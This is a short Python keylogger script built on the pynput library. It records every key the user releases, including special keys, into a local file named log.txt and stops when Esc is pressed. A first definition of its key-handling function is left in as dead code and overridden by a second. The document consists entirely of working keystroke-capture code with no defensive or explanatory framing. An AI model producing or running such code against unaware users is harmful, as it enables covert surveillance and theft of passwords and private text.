from pynput.keyboard import Listener, Key
 
def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(text)
    
def monitor(key):
    if key == Key.enter:
        key = ' '
        log(" ")

    if key == Key.backspace:
        key = 'apagar'

    if key == Key.space:
        key = ' '

    if key == Key.shift_r:
        key = 'shif_direito'

    if key == Key.shift:
        key = 'shift_esquerdo'

    if key == Key.cmd:
        key = 'windows'


 
def monitor(key):
    if key == Key.enter:
        log("\n")
    try:
        log(key.char)
    except AttributeError:
        log(" <" +str(key)+ "> ")
    if key == Key.esc:
        return False
    else: print(key)
     
with Listener(on_release=monitor) as listener:
    listener.join()
